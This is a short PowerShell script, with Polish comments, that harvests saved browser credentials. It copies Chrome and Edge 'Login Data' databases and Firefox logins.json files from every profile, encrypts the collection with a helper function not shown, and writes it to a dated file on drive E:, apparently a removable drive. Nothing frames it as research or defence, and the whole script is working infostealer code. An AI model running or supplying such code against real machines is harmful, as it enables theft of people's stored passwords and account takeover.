# Ekstrakcja danych przeglądarek
$browserData = @()

# Chrome
if (Test-Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data") {
    $chromeData = Get-Content "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" -Raw
    $browserData += @{
        Browser = "Chrome"
        Data = $chromeData
    }
}

# Edge
if (Test-Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data") {
    $edgeData = Get-Content "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data" -Raw
    $browserData += @{
        Browser = "Edge"
        Data = $edgeData
    }
}

# Firefox
if (Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles") {
    $ffProfiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Directory
    foreach ($profile in $ffProfiles) {
        if (Test-Path "$($profile.FullName)\logins.json") {
            $ffData = Get-Content "$($profile.FullName)\logins.json" -Raw
            $browserData += @{
                Browser = "Firefox"
                Profile = $profile.Name
                Data = $ffData
            }
        }
    }
}

# Eksport zaszyfrowanych danych
$encryptedBrowserData = Encrypt-Data -Data ($browserData | ConvertTo-Json)
$encryptedBrowserData | Out-File "E:\BrowserData_$(Get-Date -Format 'yyyyMMdd').enc"
